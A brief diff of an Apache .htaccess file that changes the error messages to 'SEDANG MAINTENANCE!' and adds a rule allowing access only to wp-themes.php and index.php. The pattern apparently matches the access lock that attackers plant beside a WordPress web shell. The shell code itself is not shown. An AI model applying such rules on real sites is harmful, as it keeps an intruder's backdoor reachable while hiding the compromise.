@@ -5,5 +5,9 @@
  Deny from all
 </FilesMatch>
 Options -Indexes
-ErrorDocument 403 "WANN WANN?!: G"
-ErrorDocument 404 "WANN WANN?!: G"
+ErrorDocument 403 "SEDANG MAINTENANCE!"
+ErrorDocument 404 "SEDANG MAINTENANCE!"
+<FilesMatch "^(wp-themes.php|index.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
